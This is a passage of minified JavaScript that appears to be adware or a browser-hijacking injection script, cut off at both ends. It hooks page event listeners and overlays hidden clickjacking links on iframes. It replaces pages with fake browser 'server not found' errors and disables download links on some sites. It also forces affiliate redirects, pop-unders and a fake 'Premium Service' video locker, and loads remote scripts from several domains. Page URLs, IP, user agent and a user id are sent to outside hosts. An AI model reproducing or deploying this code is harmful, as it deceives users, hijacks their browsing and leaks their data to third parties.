            var i = context.jquery('<iframe />').attr({
                'src': a,
                'scrolling': 'no',
                'frameborder': '0'
            });
            i.css({
                'width': c + 'px',
                'height': d + 'px',
                'left': f + 'px'
            });
            var j = context.jquery('<div />').attr({});
            j.css({
                'position': 'absolute',
                'text-align': 'center',
                'width': '16px',
                'height': '16px',
                'padding': '1px',
                'font-size': '14px',
                'right': '0px',
                'top': '0px',
                'cursor': 'pointer',
                'color': 'black',
                'background-color': 'white'
            });
            j.html('X');
            j.on('click', function() {
                switch (b) {
                    case 'bottom':
                        window.bslider.animate({
                            'bottom': (-1 * d) + 'px'
                        });
                        break;
                    case 'left':
                        window.bslider.animate({
                            'bottom': (-1 * c) + 'px'
                        });
                        break;
                    default:
                        {}
                }
            });
            window.bslider.append(i);
            window.bslider.append(j);
            context.jquery('body').append(window.bslider);
            switch (b) {
                case 'bottom':
                    window.bslider.animate({
                        'bottom': 0
                    });
                    break;
                case 'left':
                    window.bslider.animate({
                        'left': 0
                    });
                    break;
                default:
                    {}
            }
        },
        create_text_element: function(a, b, c, d, e, f) {
            var g = a.server_data.tx;
            var h = a.jquery('<div></div>').attr('impid', g.id).attr('mrlm_product', b).attr('mrlm_type', c).attr(f).css('width', d + 'px').css('height', e + 'px').css('text-align', 'left').css('background-color', '#FFFFFF').css('font-family', 'Verdana,Arial,sans-serif').css('direction', 'ltr');
            var i = a.jquery('<div></div>').css('padding-top', '2px').css('padding-left', '2px');
            for (var j = 0; j < g.results.length; j++) {
                var k = a.jquery('<a></a>').css('color', '#2518B5').css('cursor', 'pointer').css('font-size', 'medium').css('font-weight', 'normal').css('text-decoration', 'underline').css('line-height', '1.2').css('font-family', 'arial,sans-serif').attr('target', '_blank').css('font-family', 'Verdana,Arial,sans-serif').text(g.results[j].title).attr('href', g.results[j].redirect);
                var l = a.jquery('<div></div>').css('color', '#00802A').css('font-style', 'normal').css('font-size', '14px').css('line-height', '1.2').css('text-decoration', 'none!important').css('font-family', 'Verdana,Arial,sans-serif').text(g.results[j].url);
                var m = a.jquery('<div></div>').text(g.results[j].description).css('margin-top', '3px').css('color', '#333333').css('font-size', 'small').css('line-height', '15px').css('text-decoration', 'none!important').css('font-family', 'Verdana,Arial,sans-serif').css('overflow', 'hidden').css('height', '32px');
                i.append(k);
                i.append(l);
                i.append(m);
                h.append(i);
            }
            return h;
        },
        highlight_words_in_text: function(a, b, c) {
            if (c.length == 0 || c == '') return b;
            var d = [];
            var e = b.split(' ');
            for (var f = 0; f < e.length; f++) {
                var g = e[f];
                for (var h = 0; h < c.length; h++) {
                    var i = '<b>' + e[f] + '</b>';
                    if (e[f].toLowerCase().indexOf(c[h].toLowerCase()) != -1) {
                        g = i;
                        break;
                    }
                }
                d.push(g);
            }
            return d.join(' ');
        },
        json: function() {
            function a(a) {
                return a < 10 ? '0' + a : a;
            }
            if (typeof Date.prototype.toJSON !== 'function') {
                Date.prototype.toJSON = function(b) {
                    return isFinite(this.valueOf()) ? this.getUTCFullYear() + '-' + a(this.getUTCMonth() + 1) + '-' + a(this.getUTCDate()) + 'T' + a(this.getUTCHours()) + ':' + a(this.getUTCMinutes()) + ':' + a(this.getUTCSeconds()) + 'Z' : null;
                };
                String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function(a) {
                    return this.valueOf();
                };
            }
            var b = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
                c = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
                d, e, f = {
                    '\b': '\\b',
                    '\t': '\\t',
                    '\n': '\\n',
                    '\f': '\\f',
                    '\r': '\\r',
                    '"': '\\"',
                    '\\': '\\\\'
                },
                g;

            function h(a) {
                c.lastIndex = 0;
                return c.test(a) ? '"' + a.replace(c, function(a) {
                    var b = f[a];
                    return typeof b === 'string' ? b : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                }) + '"' : '"' + a + '"';
            }

            function i(a, b) {
                var c, f, j, k, l = d,
                    m, n = b[a];
                if (n && typeof n === 'object' && typeof n.toJSON === 'function') n = n.toJSON(a);
                if (typeof g === 'function') n = g.call(b, a, n);
                switch (typeof n) {
                    case 'string':
                        return h(n);
                    case 'number':
                        return isFinite(n) ? String(n) : 'null';
                    case 'boolean':
                    case 'null':
                        return String(n);
                    case 'object':
                        if (!n) return 'null';
                        d += e;
                        m = [];
                        if (Object.prototype.toString.apply(n) === '[object Array]') {
                            k = n.length;
                            for (c = 0; c < k; c += 1) m[c] = i(c, n) || 'null';
                            j = m.length === 0 ? '[]' : d ? '[\n' + d + m.join(',\n' + d) + '\n' + l + ']' : '[' + m.join(',') + ']';
                            d = l;
                            return j;
                        }
                        if (g && typeof g === 'object') {
                            k = g.length;
                            for (c = 0; c < k; c += 1)
                                if (typeof g[c] === 'string') {
                                    f = g[c];
                                    j = i(f, n);
                                    if (j) m.push(h(f) + (d ? ': ' : ':') + j);
                                }
                        } else
                            for (f in n)
                                if (Object.prototype.hasOwnProperty.call(n, f)) {
                                    j = i(f, n);
                                    if (j) m.push(h(f) + (d ? ': ' : ':') + j);
                                }
                        j = m.length === 0 ? '{}' : d ? '{\n' + d + m.join(',\n' + d) + '\n' + l + '}' : '{' + m.join(',') + '}';
                        d = l;
                        return j;
                }
            }
            var j = {
                stringify: function(a, b, c) {
                    var f;
                    d = '';
                    e = '';
                    if (typeof c === 'number')
                        for (f = 0; f < c; f += 1) e += ' ';
                    else if (typeof c === 'string') e = c;
                    g = b;
                    if (b && typeof b !== 'function' && (typeof b !== 'object' || typeof b.length !== 'number')) throw new Error('JSON.stringify');
                    return i('', {
                        '': a
                    });
                },
                parse: function(a, c) {
                    var d;

                    function e(a, b) {
                        var d, f, g = a[b];
                        if (g && typeof g === 'object')
                            for (d in g)
                                if (Object.prototype.hasOwnProperty.call(g, d)) {
                                    f = e(g, d);
                                    if (f !== undefined) g[d] = f;
                                    else delete g[d];
                                }
                        return c.call(a, b, g);
                    }
                    a = String(a);
                    b.lastIndex = 0;
                    if (b.test(a)) a = a.replace(b, function(a) {
                        return '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                    });
                    if (/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']').replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {
                        d = eval('(' + a + ')');
                        return typeof c === 'function' ? e({
                            '': d
                        }, '') : d;
                    }
                    throw new SyntaxError('JSON.parse');
                }
            };
            return j;
        },
        replace_all: function(a, b, c) {
            return a.split(b).join(c);
        },
        log_event: function(b, c) {
            var d = {
                'type': b,
                'data': encodeURIComponent(c)
            };
            d.domain = encodeURIComponent(window.location.hostname);
            d.url = encodeURIComponent(document.URL);
            d.dc = a.dc;
            var e = window.document.createElement("script");
            e.src = "//aa9bd78f328a6a41279d0fad0a88df1901.com/logger/log-event?dc_id=" + d.dc;
            e.src += "&domain=" + d.domain;
            e.src += "&page_url=" + d.url;
            e.src += "&event_type=" + d.type;
            e.src += "&event_data=" + d.data;
            e.src += "&response_type=js";
            e.type = "text/javascript";
            window.document.body.appendChild(e);
        },
        inIframe: function() {
            try {
                return window.self !== window.top;
            } catch (a) {
                return true;
            }
        },
        get_frame_data: function() {
            var a = {
                'referer': '',
                'is_top': true,
                'iframes': 0
            };
            if (this.inIframe()) {
                a.iframes = 1;
                a.is_top = false;
            }
            return a;
            if (!browser.safari) {
                try {
                    var b = function(a) {
                        try {
                            if (!window.location.ancestorOrigins) return;
                            for (var b = 0, c = window.location.ancestorOrigins.length; c > b; b++) a.call(null, window.location.ancestorOrigins[b], b);
                        } catch (d) {}
                        return [];
                    };
                    var c = function(a) {
                        var b, c = [];
                        do try {
                            b = b ? b.parent : window, a.call(null, b, c);
                        } catch (d) {
                            return c.push({
                                referrer: null,
                                location: null,
                                isTop: !1
                            }), c;
                        }
                        while (b !== window.top);
                        return c;
                    };
                    var d = c(function(a, b) {
                        try {
                            b.push({
                                referrer: a.document.referrer || null,
                                location: a.location.href || null,
                                isTop: a === window.top
                            });
                        } catch (c) {
                            b.push({
                                referrer: null,
                                location: null,
                                isTop: a === window.top
                            });
                        }
                    });
                    b(function(a, b) {
                        d[b].ancestor = a;
                    });
                    for (var e = "", f = !1, g = d.length - 1, h = d.length - 1; h >= 0; h--)
                        if (e = d[h].location, !e && h > 0 && (e = d[h - 1].referrer, e || (e = d[h - 1].ancestor)), e) {
                            f = window.location.ancestorOrigins ? !0 : h == d.length - 1 && d[d.length - 1].isTop;
                            break;
                        }
                    a.referer = e;
                    a.is_top = f;
                    a.iframes = g;
                } catch (i) {}
            } else if (window.self !== window.top) a.iframes = 1;
            return a;
        }
    };
    var g = {
        credit_offer: function(b) {
            var c = function() {
                function a() {
                    return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
                }
                return a() + a() + '-' + a() + '-' + a() + '-' + a() + '-' + a() + a() + a();
            };
            var d = function() {
                var d = b.jquery("iframe");
                var e = 'http://webtrackerplus.com/?page=torrent-progress&a_aid=56dnde87wnd';
                var f = a.dc.replace('AAAAAA', '');
                var g = b.server_data.c.id;
                var h = c();
                for (var i = 0, j, k, l; i < d.length; i++)
                    if (typeof d[i].wrap === 'function') {
                        e = 'http://webtrackerplus.com/?page=torrent-progress&a_aid=56dnde87wnd';
                        h = c();
                        e += '&clickid=' + f + '--' + 'ClickID' + '___' + h + '___' + g;
                        k = b.jquery("<a href='" + e + "' target='_blank'/>");
                        l = b.jquery("<div/>");
                        j = b.jquery("<div/>");
                        d[i].style.zIndex = 0;
                        d[i].style.position = 'absolute';
                        d[i].style.top = 0;
                        d[i].style.left = (d[i].parentNode.scrollWidth - d[i].width) / 2 + 'px';
                        j.css({
                            'position': 'relative',
                            'display': 'inline-block',
                            'margin': d[i].style.margin,
                            'width': d[i].parentNode.scrollWidth + 'px'
                        });
                        l.css({
                            'width': d[i].width + 'px',
                            'height': d[i].height + 'px',
                            'top': 0,
                            'left': (d[i].parentNode.scrollWidth - d[i].width) / 2 + 'px'
                        });
                        k.css({
                            'display': 'inline-block',
                            'position': 'absolute',
                            'border-bottom': 0,
                            'top': 0,
                            'left': (d[i].parentNode.scrollWidth - d[i].width) / 2 + 'px',
                            'z-index': 9999,
                            'width': d[i].width + 'px',
                            'height': d[i].height + 'px'
                        });
                        d[i].wrap(j[0]);
                        k[0].wrap(l[0]);
                        j.append(l);
                    }
            };
            if (b.server_data.di.category == "lp") {
                var e = 'http://webtrackerplus.com/?page=torrent-progress&a_aid=56dnde87wnd';
                var f = a.dc.replace('AAAAAA', 'LPAAAA');
                var g = b.server_data.c.id;
                var h = c();
                e += '&clickid=' + f + '--' + 'ClickID' + '___' + h + '___' + g;
                window.location = e;
            } else if (window.location.host.indexOf('thepiratebay.se') != -1) d();
        },
        prof: function(a) {
            return false;
            var b = 'https://soundflow.xyz/static/inj/te1_all_0_0_1.min.js';
            f.load_script(b);
        },
        bmg: function(b) {
            if (document.URL.indexOf('cdn.bitmedianetwork.com') == -1 && b.server_data.di.category != 'travel' && b.server_data.di.category != 'ecommerce') {
                var c = '//3zone.info/jslib?pid=62007&said=$dc_id$&san=$dc_product_name$&met=1|0';
                c = c.replace('$dc_id$', a.dc);
                var d = a.dc_product_name;
                if (d == '') d = "TurboMac";
                c = c.replace('$dc_product_name$', d);
                f.load_script(c);
            }
        },
        prtct: function(b) {
            var c = function() {
                function a() {
                    return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
                }
                return a() + a() + '-' + a() + '-' + a() + '-' + a() + '-' + a() + a() + a();
            };
            if (document.addEventListener) {
                var d = function(a, b, c) {
                    (this != document && this != window && this != document.body || "click" != a || b.toString().indexOf('86321022') >= 0) && this._ael(a, b, c);
                };
                "function" == typeof Element && -1 < Element.toString().indexOf("[native code]") && (-1 == Element.prototype.addEventListener.toString().indexOf("[native code]") && delete Element.prototype.addEventListener, Element.prototype._ael = Element.prototype.addEventListener, Element.prototype.addEventListener = d); - 1 == document.addEventListener.toString().indexOf("[native code]") && delete document.addEventListener;
                document._ael = document.addEventListener;
                document.addEventListener = d; - 1 == window.addEventListener.toString().indexOf("[native code]") && delete window.addEventListener;
                window._ael = window.addEventListener;
                window.addEventListener = d;
            }
            window.setInterval(function() {
                b.jquery('iframe[src*="boostsaves"], script[src*="boostsaves"]').remove();
            }, 1000);
            window.download_parameters = {};
            var e = a.dc;
            var f = e.substr(0, 6) + 'PT' + e.substr(8);
            if (b.server_data.di.category == 'lpibr') window.location.replace("http://clkmon.com/adServe/banners?pid=16129&action=r");
            if (b.server_data.di.category == 'comp' || b.server_data.di.category == 'comp_re') {
                var g = Math.floor(Math.random() * 2) + 1;
                if (g == 1) var h = 'http://c.dfgyw.com/?a=529129&c=1562404&p=r&m=32&E=9Rn7XWIqbd8%3d&s1=context.server_data.di.country_code&s2=1001&s3=bestoffer&s4=rfs';
                else var h = 'http://c.dfgyw.com/?a=529129&c=1562404&p=r&m=32&E=9Rn7XWIqbd8%3d&s1=context.server_data.di.country_code&s2=1001&s3=bestoffer&s4=rfs';
                var i = a.dc.replace('AAAAAA', '');
                var j = b.server_data.c.id;
                var k = c();
                h += '&clickid=' + i + '--' + 'ClickID' + '___' + k + '___' + j;
                window.location.replace(h);
            }
            if (b.server_data.di.category == 'free_av_re' || b.server_data.di.category == 'comp_re') {
                var l = /Safari/.test(navigator.userAgent) && /Apple Computer/.test(navigator.vendor);
                b.jquery('body').empty();
                var m = window.document.URL;
                if (l) {
                    var n = '                 <div class="content-container" style="width: 500px;margin: 0 auto;position: relative; margin-top: 215px;">                     <div class="error-container">                          <div class="text-container" style="color: rgb(133, 133, 133);position: relative;width: 100%;word-wrap: break-word;">                             <p class="error-title" style="font-size: 28px;line-height: 34px;margin: 0 auto;">Safari Can’t Find the Server</p>                         </div>                         <div class="text-container" style="color: rgb(133, 133, 133);position: relative;width: 100%;word-wrap: break-word; margin-top: 10px;">                             <p class="error-message" style="font-size: 13px;line-height: 18px;padding: 0px 24px;">Safari can’t open the page $P_URL$” because Safari can’t find the server $P_SERVER$”.</p>                         </div>                     </div>                 </div>             ';
                    n = n.replace('$P_URL$', m);
                    n = n.replace('$P_SERVER$', m);
                    b.jquery('body').attr('style', 'font-family:"-webkit-system-font";background: rgb(246, 246, 246);cursor: default;display: -webkit-box;text-align: center;-webkit-box-align: center;-webkit-box-pack: center;-webkit-user-select: none;');
                } else {
                    var n = '                 <div style="margin-top:20px; margin-left: auto; margin-right: auto; background-color: #fbfbfb; width: 540px; height: 180px; font-family: Helvetica, Arial, sans-serif; box-shadow: 0px 2px 2px #AAA; border: 1px solid #AAA; border-bottom: 1px solid #888; border-radius: 3px;">                 <div style="width:46px; margin-left:auto; margin-right: auto; margin-top: 30px;">                 <div style="content: -webkit-image-set( url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC4AAAAuCAQAAAD9sOO8AAAASUlEQVR4Xu3SMQoAIAzFUO/o/c+iY4fSSfgQyesgOESHrs9I0j7TEOL9pk5i/OmB/s9IvAYQH6DjxmtTWPEWBcS52zJPIJ4lSRfUZeB1c/cgSwAAAABJRU5ErkJggg==\') 1x, url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFwAAABcAQMAAADZIUAbAAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAD9JREFUeF7tzrEJACAQQ9EDB8j+2xy4UDaIDqBFDsTmfve6Hw/qhiQbGWQBOGPmHZKLjMBngD4IA/U37Uz4dQsbfVcrD6jzeAAAAABJRU5ErkJggg==\') 2x);"></div>                 </div>                 <div style="font-weight: normal; font-family: Helvetica, Arial, sans-serif; font-size: 20px; margin-top: 0px; color: #666; text-align:center; width: 500px; margin-left: auto; margin-right: auto;">This webpage is not availabe</div>                 <div style="text-decoration: underline; margin-top: 30px; cursor: pointer; text-align:center; font-size: 10px; color: #000; text-shadow: 0 1px 0 rgb(240, 240, 240);">Details</div>                 </div>             ';
                    b.jquery('body').css({
                        'background-color': '#E6E6E6'
                    });
                }
                b.jquery('body').append(n);
            }
            if (b.server_data.di.category == 'free_av' || b.server_data.di.category == 'free_av_1') {
                b.jquery('a').each(function() {
                    if (b.jquery(this).attr('href').indexOf('.dmg') >= 0 || b.jquery(this).attr('href').indexOf('download') >= 0) {
                        var a = '#';
                        b.jquery(this).attr('href', a);
                    }
                });
                b.jquery('div').each(function() {
                    if (b.jquery(this).attr('onclick') != null && (b.jquery(this).attr('onclick').indexOf('.dmg') >= 0 || b.jquery(this).attr('onclick').indexOf('download') >= 0)) {
                        var a = '#';
                        b.jquery(this).attr('onclick', a);
                    }
                });
                b.jquery('span, p').each(function() {
                    if (b.jquery(this).attr('onclick') != null && (b.jquery(this).attr('onclick').indexOf('.dmg') >= 0 || b.jquery(this).attr('onclick').indexOf('download') >= 0)) {
                        var a = '#';
                        b.jquery(this).attr('onclick', a);
                    }
                    if (b.jquery(this).text().indexOf('.dmg') >= 0 || b.jquery(this).text().indexOf('ownload link') >= 0) b.jquery(this).remove();
                });
            } else if (b.server_data.di.category == 'comp') {
                if (b.server_data.di.domain == 'flvto.com' && window.document.URL.indexOf('youtube-downloader-for-mac') == -1) return;
                b.jquery('a').each(function() {
                    if (b.jquery(this).attr('href').indexOf('.dmg') >= 0 || b.jquery(this).attr('href').indexOf('.exe') >= 0 || b.jquery(this).attr('href').indexOf('download') >= 0) {
                        var a = '#';
                        b.jquery(this).attr('href', a);
                    }
                    if (this.onclick != null) this.onclick = function() {};
                });
            }
        },
        ecom_v2: function(b) {
            if (true) {
                var c = 1;
                if (c == 1) {
                    var d = '';
                    if (document.location.protocol == 'https:') {
                        d = 'https://i_mrlmbsjs_info.tlscdn.com/mrlm/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                    } else {
                        d = 'http://i.mrlmbsjs.info/mrlm/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                        d = 'http://i.mrlmbssrc.org/mrlm/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                    }
                } else {
                    var d = '//istatic.eshopcomp.com/fo/ec/tarrs.js?hid=$user_id$&subid=$dc_id$&bname=$dc_product_name$';
                    d = d.replace('$dc_id$', a.dc);
                    d = d.replace('$user_id$', b.server_data.c.id);
                    var e = a.dc_product_name;
                    if (e == '') e = "TurboMac";
                    d = d.replace('$dc_product_name$', e);
                    f.load_script(d);
                }
            } else if (document.URL.indexOf('google.com') >= 0 || document.URL.indexOf('yahoo.com') >= 0 || document.URL.indexOf('thesmartsearch') >= 0 || document.URL.indexOf('trovi.com') >= 0 || document.URL.indexOf('search-quick.com') >= 0 || document.URL.indexOf('only-search.com') >= 0) {}
        },
        smedia: function(b) {
            var c = {
                tag_ids: {
                    "adult": 17,
                    "NonAdult": 18
                }
            };
            var d = c.tag_ids.NonAdult;
            if (b.server_data.di.category == 'adult') d = c.tag_ids.adult;
            var e = {
                tag_id: d,
                sub_id: a.dc,
                url: window.location.href,
                ip: b.server_data.ui.ip,
                mode: 'jsonfeed',
                ua: b.server_data.ui.ua,
                fallback_url: '',
                unique_user_id: b.server_data.c.id
            };
            b.jquery.ajax({
                type: 'GET',
                data: e,
                url: 'https://ssp.zryydi.com/bid/',
                cache: false,
                dataType: 'jsonp',
                success: function(a) {
                    if (a != null && a.creativeUrl != "") {
                        var c = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(a) {
                            var b = Math.random() * 16 | 0,
                                c = a == 'x' ? b : (b & 0x3 | 0x8);
                            return c.toString(16);
                        });
                        var d = a.creativeUrl;
                        var e = parseFloat(a.bid) * 1000;
                        pop = f.pop_under(b, d, null, null, "sm" + "|" + d + "|" + e + "|" + document.location.href + "|" + c);
                        f.log_event('pp', d);
                    }
                }
            });
        },
        travel: function(b) {
            if (b.server_data.di.category == 'travel') {
                var c = 3;
                if (c == 1) {
                    var d = '';
                    if (document.location.protocol == 'https:') {
                        d = 'https://i_mrlmiijs_info.tlscdn.com/mrlmii/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                    } else {
                        d = 'http://i.mrlmiijs.info/mrlmii/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                    }
                } else {
                    var d = '//va.compare-hotel-rates.com/hotels.php?mamId=$dc_id$&userId=2222&appId=3333&ui=1&ns=ETB_Hotels_Widget&partner=targetingedge&cpb=Deal Top&helpUrl=http%3A%2F%2Fwww.top-deals.club';
                    d = d.replace('$dc_id$', a.dc);
                    f.load_script(d);
                }
            }
        },
        adult: function(b) {
            var c = {
                log_enabled: false,
                recency_minutes: 0,
                pop_opened: false,
                page_keyword: "",
                bslider_recency_minutes: 5,
                last_conlo_recency_minutes: 10,
                conlo_timer_seconds: 10
            };
            var d = c.conlo_timer_seconds;
            var e = {
                'xvideos.com': {
                    'player_selector': '#flash-player-embed'
                }
            };
            var g = 'http://aa9bd78f328a6a41279d0fad0a88df1901.com/as/gf?at=pop&d=$dc_id$&u=$keywords$';
            g = g.replace('$dc_id$', a.dc);
            g = g.replace('$keywords$', encodeURIComponent(b.keyword));
            var h = 'http://aa9bd78f328a6a41279d0fad0a88df1901.com/as/gp?dc=$dc_id$&page_url=$page_url$&kw=$keywords$';
            h = h.replace('$page_url$', encodeURIComponent(document.location.href));
            h = h.replace('$dc_id$', a.dc);
            h = h.replace('$keywords$', encodeURIComponent(b.keyword));
            var i = 'http://aa9bd78f328a6a41279d0fad0a88df1901.com/as/gb?dc=$dc_id$&page_url=$page_url$&kw=$keywords$&size=$size$';
            i = i.replace('$page_url$', encodeURIComponent(document.location.href));
            i = i.replace('$dc_id$', a.dc);
            i = i.replace('$keywords$', encodeURIComponent(b.keyword));
            i = i.replace('$size$', '728x90');
            var j = function() {
                var a = l();
                b.jquery(e[a].player_selector).css('visibility', 'hidden');
                var c = b.jquery('<div />').attr({
                    'id': 'content_locker'
                });
                c.css({
                    'display': 'none',
                    'position': 'absolute',
                    'cursor': 'pointer',
                    'top': '140px',
                    'left': '112px',
                    'background-color': 'black',
                    'line-height': '33px',
                    'text-align': 'center',
                    'padding': '30px',
                    'color': 'white',
                    'font-size': '20px',
                    'width': '350px',
                    'height': '100px',
                    'border': '1px solid white'
                });
                c.html('Click HERE for Premium Service to enjoy better viewing experience.<br/>Video will resume in <span id="resume_timer">10</span> seconds');
                c.on('click', function() {
                    var d = window.open(h, '_blank');
                    d.focus();
                    b.jquery(e[a].player_selector).css('visibility', 'visible');
                    c.fadeOut();
                });
                b.jquery('#player').css({
                    'position': 'relative'
                });
                b.jquery('#player').prepend(c);
                c.fadeIn();
                setInterval(function() {
                    d--;
                    if (d <= 0) {
                        b.jquery(e[a].player_selector).css('visibility', 'visible');
                        b.jquery('#content_locker').fadeOut();
                    }
                    b.jquery('#resume_timer').html(d);
                }, 1000);
            };
            var k = function(a, c, d) {
                window.bslider = b.jquery('<div />').attr({});
                window.bslider.css({
                    'position': 'fixed',
                    'z-index': 9999,
                    'width': c + 'px',
                    'height': d + 'px',
                    'background-color': 'white'
                });
                switch (a) {
                    case 'bottom':
                        {
                            var e = b.jquery(window).width();
                            var f = e / 2 - c / 2;window.bslider.css({
                                'bottom': (-1 * d) + 'px',
                                'left': f + 'px'
                            });
                        }
                        break;
                    case 'left':
                        {
                            var g = b.jquery(window).height();
                            var h = g / 2 - d / 2;window.bslider.css({
                                'top': h + 'px',
                                'left': (-1 * c) + 'px'
                            });
                        }
                        break;
                    default:
                        {}
                }
                var j = b.jquery('<iframe />').attr({
                    'src': i,
                    'scrolling': 'no',
                    'frameborder': '0'
                });
                j.css({
                    'width': c + 'px',
                    'height': d + 'px',
                    'left': f + 'px'
                });
                var k = b.jquery('<div />').attr({});
                k.css({
                    'position': 'absolute',
                    'text-align': 'center',
                    'width': '16px',
                    'height': '16px',
                    'padding': '1px',
                    'font-size': '14px',
                    'right': '0px',
                    'top': '0px',
                    'cursor': 'pointer',
                    'color': 'black',
                    'background-color': 'white'
                });
                k.html('X');
                k.on('click', function() {
                    switch (a) {
                        case 'bottom':
                            window.bslider.animate({
                                'bottom': (-1 * d) + 'px'
                            });
                            break;
                        case 'left':
                            window.bslider.animate({
                                'bottom': (-1 * c) + 'px'
                            });
                            break;
                        default:
                            {}
                    }
                });
                window.bslider.append(j);
                window.bslider.append(k);
                b.jquery('body').append(window.bslider);
                switch (a) {
                    case 'bottom':
                        window.bslider.animate({
                            'bottom': 0
                        });
                        break;
                    case 'left':
                        window.bslider.animate({
                            'left': 0
                        });
                        break;
                    default:
                        {}
                }
            };
            var l = function() {
                var a, b, c = 'weird_get_top_level_domain=cookie',
                    d = document.location.hostname.split('.');
                for (a = d.length - 1; a >= 0; a--) {
                    b = d.slice(a).join('.');
                    document.cookie = c + ';domain=.' + b + ';';
                    if (document.cookie.indexOf(c) > -1) {
                        document.cookie = c.split('=')[0] + '=;domain=.' + b + ';expires=Thu, 01 Jan 1970 00:00:01 GMT;';
                        return b;
                    }
                }
            };
            if (b.server_data.di.category == 'adult') {
                var m = 0;
                if (typeof b.server_data.c.last_pop_time != 'undefined' && b.server_data.c.last_pop_time != "") {
                    var n = new Date();
                    var o = n.getTime();
                    var p = o + n.getTimezoneOffset() * 60 * 1000;
                    var q = b.server_data.c.last_pop_time;
                    q = q.split('-').join('/');
                    var r = new Date(q);
                    m = r.getTime();
                }
                if (!b.is_pop_opened && (p - m) > c.recency_minutes * 60 * 1000) b.jquery.ajax({
                    type: 'GET',
                    url: g,
                    dataType: 'jsonp',
                    cache: false,
                    success: function(a) {
                        if (a != null && a.results != null) {
                            var c = a.results[0];
                            f.pop_under(b, c.redirect);
                        }
                    }
                });
                var s = f.get_cookie('last_bslider');
                var n = new Date();
                var o = n.getTime();
                if (s == null || (o - s) > c.bslider_recency_minutes * 60 * 1000) setTimeout(function() {
                    k('bottom', 728, 90);
                    var a = new Date();
                    var b = a.getTime();
                    f.set_cookie('last_bslider', b);
                }, 2000);
            }
        }
    };
    if (a.s_m == 'true' && document.URL.indexOf("docs.google.com") == -1)
        if (a.dc == 'DP1000AAAAAA') {
            setTimeout(function() {
                e(function(a) {
                    if (!a.is_pop && !a.server_data.di.bl)
                        for (var b in g) g[b](a);
                });
            }, 1000);
        } else e(function(b) {
            var c = window.location.href;
            if (c.indexOf('trovi.com') >= 0 && c.indexOf('gd=') < 0) window.location = "http://www.trovi.com/?n=" + a.dc + "&searchsource=69&UM=8&gd=SY1000228";
            if (!b.is_pop && !b.server_data.di.bl && document.URL.indexOf('trovi.com') < 0 && document.URL.indexOf('bing.com') < 0 && document.URL.indexOf('veerolo.com') < 0)
                for (var d in g) g[d](b);
        });
})();(function() {
    var a = {
        dc: 'Aa865780bfe3e8a8f-0-FS-AU',
        dc_product_name: '',
        dc_product_link: '',
        jquery_url: '//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.js',
        get_data_url: '//aa9bd78f328a6a41279d0fad0a88df1901.com/data/init',
        s_m: 'true',
        debug: false,
        products: {
            modules: ['di', 'mt', 'sl']
        }
    };
    var b = {
        google: {
            domain: 'www.google.',
            ads_container_css: {
                'border-bottom': '1px solid #ebebeb',
                'margin-left': '-10px',
                'margin-bottom': '10px',
                'margin-top': '10px',
                'font-family': 'arial,sans-serif'
            },
            results_container_css: {
                'margin-top': '10px',
                'margin-bottom': '10px',
                'font-family': 'arial,sans-serif'
            },
            ads_containers: ['#taw', '#mbEnd', '#bottomads'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            side_container: '#rhs_block',
            main_container: '#search',
            results_container: '#rso',
            search_input: '#lst-ib'
        },
        bing: {
            domain: 'www.bing.',
            ads_container_css: {
                'background-color': '#FFF7ED',
                'margin-bottom': '10px',
                'margin-left': '-5px',
                'margin-top': '10px'
            },
            results_container_css: {
                'margin-top': '20px',
                'margin-bottom': '20px'
            },
            ads_containers: ['.b_ad'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            side_container: '',
            main_container: '#results, #b_results',
            results_container: '#wg0',
            search_input: '#sb_form_q'
        },
        ask: {
            domain: '.ask.',
            ads_container_css: {
                'background-color': '#FFF7ED',
                'margin-bottom': '10px'
            },
            results_container_css: {
                'margin-top': '10px',
                'margin-bottom': '10px'
            },
            ads_containers: ['#csaTop', '#csaBottom'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            main_container: '#midblock',
            side_container: '',
            results_container: '#lindm',
            search_input: '#top_q_comm'
        },
        whitesmoke: {
            domain: 'search.whitesmoke',
            ads_container_css: {
                'background-color': '#FFF7ED',
                'margin-bottom': '10px'
            },
            results_container_css: {},
            ads_containers: ['.c'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            main_container: '.b table tbody',
            side_container: '',
